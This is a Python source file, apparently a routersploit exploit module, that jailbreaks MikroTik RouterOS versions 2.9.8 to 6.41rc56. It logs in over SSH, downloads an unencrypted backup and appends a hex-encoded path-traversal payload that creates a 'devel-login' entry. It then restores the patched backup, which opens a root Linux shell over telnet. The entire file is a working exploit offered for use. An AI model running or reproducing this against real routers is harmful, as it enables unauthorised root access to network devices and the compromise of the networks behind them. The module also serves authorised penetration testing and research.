import re
from struct import pack, unpack
from routersploit.core.exploit import *
from routersploit.core.ssh.ssh_client import SSHClient


class Exploit(SSHClient):
    __info__ = {
        "name": "Mikrotik RouterOS Jailbreak",
        "description": "Module creates \"devel\" user on RouterOS from 2.9.8 to 6.41rc56.",
        "authors": (
            "GH0st3rs",  # routersploit module
        ),
        "references": (
            "https://github.com/0ki/mikrotik-tools",
        ),
        "devices": (
            "Mikrotik RoutersOS versions from 2.9.8 up to 6.41rc56",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(22, "Target SSH port")

    username = OptString("admin", "Username to log in with")
    password = OptString("", "Password to log in with")

    def __init__(self):
        self.ssh_client = None

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            if self.backup_configuration():
                print_status("Downloading current configuration...")
                content = self.ssh_client.get_content("/backup.backup")

                backup = self.backup_patch(content)
                if backup:
                    print_status("Uploading exploit...")
                    if self.backup_restore(backup):
                        print_success("Jailbreak was (likely) successful.")
                        print_success("Linux mode can be accessed via telnet using: devel/{}".format(self.password))
                    else:
                        print_error("Unable to apply patched configuration")
            else:
                print_error("Unable to export current configuration")

    @mute
    def check(self):
        self.ssh_client = self.ssh_create()

        if self.ssh_client.login(self.username, self.password):
            output = self.ssh_client.execute("/system resource print")

            res = re.findall(b"version: (.+?) ", output)
            if res:
                version = str(res[0], "utf-8")
                if "rc" in version:
                    version, rc = version.split("rc")
                    if version == "6.41" and int(rc) > 56:
                        return False

                if utils.Version("2.9.8") <= utils.Version(version) <= utils.Version("6.42"):
                    return True

        return False

    def backup_configuration(self):
        output = self.ssh_client.execute("/system backup save name=\"backup.backup\" dont-encrypt=yes")
        if b"backup saved" in output:
            return True
        else:
            output = self.ssh_client.execute("/system backup save name=\"backup.backup\"")
            if b"backup saved" in output:
                return True

        return False

    def backup_patch(self, backup):
        realsize = len(backup)
        if realsize < 8 or backup[:4] != b"\x88\xAC\xA1\xB1":
            print_error("Please check if that is a recent RouterOS backup file w/o password protection.")
            return False

        matchsize, = unpack("<I", backup[4:8])
        if matchsize != realsize:
            print_error("File is damaged. Aborting...")
            return False

        # first we write our payload
        payload = (
            b"\x1E\x00\x00\x00\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2F"
            b"\x6E\x6F\x76\x61\x2F\x65\x74\x63\x2F\x64\x65\x76\x65\x6C\x2D"
            b"\x6C\x6F\x67\x69\x6E\x2F\x00\x00\x00\x00\x00\x00\x00\x00"
        )
        matchsize += len(payload)
        backup = backup[:4] + pack("<I", matchsize) + backup[8:] + payload

        print_status("Patching done")
        return backup

    def backup_restore(self, backup):
        self.ssh_client.send_content(backup, "/backup.backup")

        output = self.ssh_client.execute("/system backup load name=\"backup.backup\" password=\"\"")
        if b"configuration restored" in output:
            return True
        else:
            output = self.ssh_client.execute("/system backup load name=\"backup.backup\"")
            if b"configuration restored" in output:
                return True

        return False
